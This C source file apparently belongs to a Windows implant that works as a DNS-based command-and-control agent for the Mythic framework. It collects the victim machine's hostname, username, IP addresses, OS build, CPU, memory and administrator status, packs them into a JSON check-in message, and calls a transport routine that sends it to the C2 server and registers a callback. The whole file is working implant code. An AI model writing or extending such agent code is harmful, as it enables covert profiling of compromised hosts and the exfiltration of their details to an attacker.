/**
 * Checkin.c - Initial check-in for DNS C2 Agent
 * 
 * Implements the initial check-in functionality for the C2 agent.
 */

// Include winsock2.h before windows.h to avoid warnings
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <shlwapi.h>
#include <objbase.h>
#include "../include/Checkin.h"
#include "../include/Utils.h"
#include "../include/Config.h"
#include "../include/Transport.h"
#include "../include/mythic.h"


// Prototipo de la función que usa RtlGetVersion
typedef LONG (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
static BOOL get_windows_version(DWORD* major, DWORD* minor, DWORD* build);

/**
 * @brief Gathers system information and returns it as a JSON string.
 * @return JSON string (caller must free), or NULL on error.
 */
char* get_system_info() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    char username[256] = {0};
    DWORD hostname_size = sizeof(hostname);
    DWORD username_size = sizeof(username);
    char* system_info   = NULL;
    char* ip_addresses  = NULL;
    char os_version[64] = {0};
    char architecture[32] = {0};
    char processor_info[256] = {0};
    DWORD memory_mb = 0;
    BOOL  is_admin  = FALSE;

    // Hostname
    GetComputerNameA(hostname, &hostname_size);

    // Username
    GetUserNameA(username, &username_size);

    // IP addresses
    {
        PIP_ADAPTER_INFO adapter_info = NULL;
        ULONG adapter_info_size = 0;
        if (GetAdaptersInfo(NULL, &adapter_info_size) == ERROR_BUFFER_OVERFLOW) {
            adapter_info = malloc(adapter_info_size);
            if (adapter_info &&
                GetAdaptersInfo(adapter_info, &adapter_info_size) == NO_ERROR) {
                ip_addresses = malloc(1024);
                if (ip_addresses) {
                    ip_addresses[0] = '\0';
                    for (PIP_ADAPTER_INFO ai = adapter_info; ai; ai = ai->Next) {
                        for (PIP_ADDR_STRING ip = &ai->IpAddressList; ip; ip = ip->Next) {
                            if (strcmp(ip->IpAddress.String, "0.0.0.0") != 0) {
                                if (ip_addresses[0]) {
                                    strcat_s(ip_addresses, 1024, ",");
                                }
                                strcat_s(ip_addresses, 1024, ip->IpAddress.String);
                            }
                        }
                    }
                }
            }
            free(adapter_info);
        }
        if (!ip_addresses || !*ip_addresses) {
            free(ip_addresses);
            ip_addresses = _strdup("unknown");
        }
    }

    // OS version
    {
        DWORD major, minor, build;
        if (get_windows_version(&major, &minor, &build)) {
            sprintf_s(os_version, sizeof(os_version), "%u.%u.%u", major, minor, build);
        } else {
            strcpy_s(os_version, sizeof(os_version), "unknown");
        }
    }

    // Architecture
    {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64:
                strcpy_s(architecture, sizeof(architecture), "x64");
                break;
            case PROCESSOR_ARCHITECTURE_INTEL:
                strcpy_s(architecture, sizeof(architecture), "x86");
                break;
            case PROCESSOR_ARCHITECTURE_ARM:
                strcpy_s(architecture, sizeof(architecture), "ARM");
                break;
#ifdef PROCESSOR_ARCHITECTURE_ARM64
            case PROCESSOR_ARCHITECTURE_ARM64:
                strcpy_s(architecture, sizeof(architecture), "ARM64");
                break;
#endif
            default:
                strcpy_s(architecture, sizeof(architecture), "Unknown");
        }
    }

    // Processor info
    {
        HKEY hKey;
        DWORD sz = sizeof(processor_info);
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                          "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
                          0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegQueryValueExA(hKey, "ProcessorNameString",
                             NULL, NULL, (LPBYTE)processor_info, &sz);
            RegCloseKey(hKey);
        } else {
            strcpy_s(processor_info, sizeof(processor_info), "Unknown");
        }
    }

    // Memory
    {
        MEMORYSTATUSEX ms;
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms)) {
            memory_mb = (DWORD)(ms.ullTotalPhys / (1024 * 1024));
        }
    }

    // Admin?
    {
        PSID admins = NULL;
        SID_IDENTIFIER_AUTHORITY nt = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&nt, 2,
                                     SECURITY_BUILTIN_DOMAIN_RID,
                                     DOMAIN_ALIAS_RID_ADMINS,
                                     0,0,0,0,0,0,
                                     &admins)) {
            CheckTokenMembership(NULL, admins, &is_admin);
            FreeSid(admins);
        }
    }

    // Build JSON (solo con campos válidos para Mythic callback)
    {
        char extra_info[512] = {0};
        sprintf_s(extra_info, sizeof(extra_info),
                  "os_version: %s, mem: %lu, admin: %s",
                  os_version, memory_mb, is_admin ? "true" : "false");

        const char* tmpl =
            "{"
            "\"host\":\"%s\","
            "\"user\":\"%s\","
            "\"ip\":\"%s\","
            "\"os\":\"Windows\","
            "\"architecture\":\"%s\","
            "\"description\":\"%s\","
            "\"pid\":0,"
            "\"extra_info\":\"%s\","
            "\"sleep_info\":\"DNS Sleep Interval\","
            "\"uuid\":\"%s\""
            "}";

        size_t needed =
            strlen(tmpl)
            + strlen(hostname)
            + strlen(username)
            + strlen(ip_addresses)
            + strlen(architecture)
            + strlen(processor_info)
            + strlen(extra_info)
            + strlen(get_agent_uuid())
            + 100;

        system_info = calloc(needed, 1);
        if (system_info) {
            sprintf_s(system_info, needed, tmpl,
                      hostname,
                      username,
                      ip_addresses,
                      architecture,
                      processor_info,
                      extra_info,
                      get_agent_uuid());
        }
    }

    free(ip_addresses);
    return system_info;
}



/**
 * @brief Perform initial check-in via DNS
 */
BOOL perform_checkin() {
    char* result = transport_perform_checkin();
    if (result) {
        register_callback(result);
        free(result);
        return TRUE;
    }
    return FALSE;
}

/**
 * @brief Retrieve real Windows version via RtlGetVersion
 */
static BOOL get_windows_version(DWORD* major, DWORD* minor, DWORD* build) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;
    RtlGetVersionPtr fn = (RtlGetVersionPtr)
        GetProcAddress(h, "RtlGetVersion");
    if (!fn) return FALSE;
    RTL_OSVERSIONINFOEXW vi = { .dwOSVersionInfoSize = sizeof(vi) };
    if (fn(&vi) != 0) return FALSE;
    *major = vi.dwMajorVersion;
    *minor = vi.dwMinorVersion;
    *build = vi.dwBuildNumber;
    return TRUE;
}
